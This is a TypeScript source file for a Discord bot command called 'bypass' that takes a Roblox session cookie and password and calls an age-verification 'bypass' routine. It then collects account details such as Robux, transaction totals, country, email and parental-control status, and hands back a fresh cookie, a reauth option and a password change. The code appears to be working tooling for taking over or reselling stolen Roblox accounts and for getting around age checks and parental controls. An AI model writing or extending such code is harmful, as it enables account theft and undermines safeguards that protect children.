// src/bot/commands/bypass.ts
import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  type ModalSubmitInteraction,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';
import { runResetAction, runChangePasswordAction } from '../../lib/actions';

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Attempt Gmail Bypassing (With API)')
  .addStringOption((opt) =>
    opt.setName('cookie').setDescription('Insert The Cookies!').setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  ) as SlashCommandBuilder;

const noEmailSessions = new Map<string, { cookie: string; password: string }>();

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);

    const validation = await Roblox.validateCookie(rawCookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const pwValid = await Roblox.validatePassword(validation.username!, password);
    if (!pwValid.valid) {
      const embed = buildErrorEmbed(
        `✧ **Invalid Password**\n────\n` +
        `⭑ The provided password is incorrect for this account.\n` +
        `⭑ Please try again.`
      );
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const email = await Roblox.fetchEmailInfo(rawCookie);
    if (!email.verified) {
      const embed = buildBaseEmbed(
        '𖣐 No Email Detected',
        `✧ **Account:** ${validation.username}\n` +
        `────\n` +
        `⭑ No verified email found on this account.\n` +
        `⭑ You can reauthenticate (reset cookie) or change the password.\n` +
        `⭑ Your credentials were not logged.`
      );
      const sessionId = Math.random().toString(36).slice(2, 10);
      noEmailSessions.set(sessionId, { cookie: rawCookie, password });
      setTimeout(() => noEmailSessions.delete(sessionId), 600000);
      const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
        new ButtonBuilder()
          .setCustomId(`bypass_reauth_${sessionId}`)
          .setLabel('🔄 Reauth')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`bypass_resetpw_${sessionId}`)
          .setLabel('🔑 Reset Password')
          .setStyle(ButtonStyle.Secondary)
      );
      await interaction.editReply({ embeds: [embed], components: [row] });
      return;
    }

    const progressEmbed = buildProgressEmbed('Sending bypass request...');
    await interaction.editReply({ embeds: [progressEmbed] });

    let lastMessage = 'Sending bypass request...';
    let timedOut = false;
    const result = await (async () => {
      let delay = 3000;
      const startTime = Date.now();
      const maxDuration = 60000;
      for (let attempt = 1; attempt <= 6; attempt++) {
        if (Date.now() - startTime > maxDuration) {
          timedOut = true;
          return { success: false, message: 'Timeout', timedOut: true };
        }
        const res = await Roblox.bypassAgeVerification(rawCookie, password);
        if (res.success) return res;
        if (res.inProgress) {
          lastMessage = `Processing... (attempt ${attempt}/6)`;
          const updateEmbed = buildProgressEmbed(lastMessage);
          await interaction.editReply({ embeds: [updateEmbed] });
          if (attempt < 6) {
            await new Promise(resolve => setTimeout(resolve, delay));
            delay = Math.min(delay * 1.5, 10000);
          }
          continue;
        }
        return res;
      }
      return { success: false, message: 'Still processing, please check later.', timedOut: true };
    })();

    if (timedOut) {
      const embed = buildProgressEmbed('Bypass timed out after 60 seconds. Please try again later.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    if (result.success) {
      const userId = validation.userId!;
      const age = await Roblox.getUserAge(userId);
      const robux = await Roblox.fetchRobux(rawCookie, String(userId));
      const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
      const country = await Roblox.fetchCountry(rawCookie);
      const parental = await Roblox.fetchParentalControls(rawCookie);
      const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

      let newCookie = result.newCookie;
      let finalUserId = userId;
      let finalUsername = validation.username!;
      let finalDisplayName = validation.displayName || null;
      let finalAge = age;
      let finalRobux = robux;
      let finalSummary = summary;
      let finalCountry = country;
      let finalEmail = email;
      let finalParental = parental;
      let finalThumb = thumb;

      if (newCookie) {
        const newValidation = await Roblox.validateCookie(newCookie);
        if (newValidation.valid) {
          finalUserId = newValidation.userId!;
          finalUsername = newValidation.username!;
          finalDisplayName = newValidation.displayName || null;
          finalAge = await Roblox.getUserAge(finalUserId);
          finalRobux = await Roblox.fetchRobux(newCookie, String(finalUserId));
          finalSummary = await Roblox.fetchTransactionTotals(newCookie, String(finalUserId));
          finalCountry = await Roblox.fetchCountry(newCookie);
          finalEmail = await Roblox.fetchEmailInfo(newCookie);
          finalParental = await Roblox.fetchParentalControls(newCookie);
          finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
        } else {
          newCookie = undefined;
        }
      }

      const embed = buildAccountEmbed(
        finalUsername,
        finalDisplayName,
        finalUserId,
        finalAge,
        finalRobux,
        finalSummary,
        finalCountry,
        finalEmail.verified ? `✅ Verified: \`${finalEmail.verified}\`` : 'No email found',
        finalParental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
        finalThumb
      );

      const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
      const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, false) : undefined;
      await interaction.editReply({ embeds: [embed], components: row ? [row] : [] });
    } else if (result.timedOut) {
      const embed = buildProgressEmbed('Bypass is still in progress. Please check later.');
      await interaction.editReply({ embeds: [embed] });
    } else {
      const embed = buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${result.message}`);
      await interaction.editReply({ embeds: [embed] });
    }
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;

  const customId = interaction.customId;
  if (!customId.startsWith('bypass_reauth_') && !customId.startsWith('bypass_resetpw_')) return;

  const parts = customId.split('_');
  const action = parts[1];
  const id = parts[2];
  const session = noEmailSessions.get(id);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please run /bypass again.', flags: MessageFlags.Ephemeral });
    return;
  }

  if (action === 'reauth') {
    const result = await runResetAction(session.cookie);
    if (result.success && result.newCookie) {
      const newId = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(newId, 'reset', result.newCookie, false);
      await interaction.reply({ embeds: [result.embed], components: [row], flags: MessageFlags.Ephemeral });
    } else {
      await interaction.reply({ embeds: [result.embed], flags: MessageFlags.Ephemeral });
    }
    noEmailSessions.delete(id);
    return;
  }

  if (action === 'resetpw') {
    const modal = new ModalBuilder()
      .setCustomId(`bypass_resetpw_modal_${id}`)
      .setTitle('Reset Password');
    const input = new TextInputBuilder()
      .setCustomId('new_password')
      .setLabel('New Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('Enter your new password');
    modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(input));
    await interaction.showModal(modal);
    return;
  }
}

async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
  const parts = interaction.customId.split('_');
  const id = parts[3];
  const session = noEmailSessions.get(id);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please run /bypass again.', flags: MessageFlags.Ephemeral });
    return;
  }

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const newPassword = interaction.fields.getTextInputValue('new_password');
  const result = await runChangePasswordAction(session.cookie, session.password, newPassword);
  await interaction.editReply({ embeds: [result.embed] });
  noEmailSessions.delete(id);
}

export const bypassCommand: Command = { data, execute, handleButton, handleModal };